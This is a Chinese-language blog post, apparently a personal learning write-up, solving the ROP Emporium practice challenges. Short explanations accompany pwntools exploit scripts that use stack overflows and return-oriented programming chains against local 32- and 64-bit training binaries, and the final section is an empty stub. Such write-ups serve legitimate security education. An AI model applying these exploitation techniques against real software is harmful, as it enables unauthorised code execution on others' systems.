---
title: ROP_Emporium
author: nepire
avatar: /images/title.ico
authorLink: 'https://nepire.github.io/'
authorAbout: 逐梦者
authorDesc: 逐梦者
categories: 技术
comments: true
date: 2019-11-05 11:45:15
tags:
keywords:
description:
photos:
---
暑假去了趟Xman认识了一群大佬，也因此受到刺激成长了不少，这里就写一篇在xman时通关的ROP—Emporium的wp来记录一下自己的学习历程





## ret2win32

### 思路

简单的rop构造，ctf-wiki上好像把这种叫做ret2text

### exp
```python
from pwn import*
context(os='linux',arch='i386',log_level='debug')
n = process('ret2win32')
elf = ELF('ret2win32')

bufsize = 40
buf = 'a'*bufsize
sh_addr = 0x08048659

payload = buf + 'aaaa' + p32(sh_addr)

def pwn():
    n.recvuntil('>')
    n.sendline(payload)

pwn()

n.interactive()
```


## ret2win

### 思路

和上面的方法一样，只有一点差别是在64位下前6个参数是通过寄存器传递，更多的参数才入栈。

### exp
```python
from pwn import*
context(os='linux',arch='amd64',log_level='debug')
n = process('ret2win')
elf = ELF('ret2win')

bufsize = 0x20
buf = 'a'*bufsize
fake_ebp = 'a'*0x8
sh_addr = 0x400811

payload = buf + fake_ebp + p64(sh_addr)

def pwn():
    n.recvuntil('>')
    n.sendline(payload)

pwn()

n.interactive()
```

## split32

### 思路
热身题，很直接的ret2syscall

### exp
```python
from pwn import*
context(os='linux',arch='i386',log_level='debug')
n = process('./split32')
elf = ELF('./split32')

system_addr = elf.plt['system']
pop_ret = 0x080483e1
sh_addr = 0x804a030
bufsize = 40
buf = 'a'*bufsize

payload = buf + 'aaaa' + p32(system_addr) + 'aaaa' + p32(sh_addr)


def pwn():
    n.recvuntil('>')
    n.sendline(payload)

pwn()

n.interactive()
```


## split

### 思路
64位的ret2syscall,比如我们想要传入一个参数，那这个参数需要被布置到寄存器rdi中，这时我们可以寻找诸如pop rdi;ret的代码片段，从而在执行完pop rdi后把栈上布置好的数据存放到寄存器rdi中后能够再次控制程序执行流（ret）

### exp
```python
from pwn import*
context(os='linux',arch='amd64',log_level='debug')
n = process('./split')
elf = ELF('./split')

bufsize = 32
buf = 'a'*bufsize
system_addr = elf.plt['system']
pop_rdi_ret = 0x400883
sh_addr = 0x601060

payload = buf + 'a'*8 + p64(pop_rdi_ret) + p64(sh_addr) + p64(system_addr)

def pwn():
    n.recvuntil('>')
    n.sendline(payload)

pwn()

n.interactive()
```

## callme32

### 思路
ret2libc的简单利用，审计过程序和libccallme32.so不难理解要得到flag要依次调用callme_one(1,2,3),callme_two(1,2,3),callme_three(1,2,3),这三个函数都是定义在libccallme32里,所以我们可以像调用system去调用(注意堆栈平衡)

### exp
```python
from pwn import*
context(os='linux',arch='i386',log_level='debug')
n = process('./callme32')
elf = ELF('./callme32')

callme_one = elf.plt['callme_one']
callme_two = elf.plt['callme_two']
callme_three = elf.plt['callme_three']
ppp_ret = 0x080488a9
bufsize = 0x28
buf = 'a'*bufsize
argv = p32(1)+p32(2)+p32(3)

payload = buf + 'aaaa'
payload += p32(callme_one)+p32(ppp_ret)+argv
payload += p32(callme_two)+p32(ppp_ret)+argv
payload += p32(callme_three)+p32(ppp_ret)+argv

def pwn():
    n.recvuntil('>')
    n.sendline(payload)

pwn()

n.interactive()
```

## callme

### 思路
和32位差不多，不过不用考虑堆栈平衡(注意64位和32位的差别)

### exp
```python
from pwn import*
context(os='linux',arch='amd64',log_level='debug')
n = process('./callme')
elf = ELF('./callme')

callme_one = elf.plt['callme_one']
callme_two = elf.plt['callme_two']
callme_three = elf.plt['callme_three']
ppp_ret = 0x401ab0
bufsize = 0x20
buf = 'a'*bufsize
argv = p64(1) + p64(2) + p64(3)

payload  = buf + 'a'*8
payload += p64(ppp_ret) + argv + p64(callme_one)
payload += p64(ppp_ret) + argv + p64(callme_two)
payload += p64(ppp_ret) + argv + p64(callme_three)

def pwn():
    n.recvuntil('>')
    n.sendline(payload)

pwn()

n.interactive()
```

## write432

### 思路



### exp
```python

```
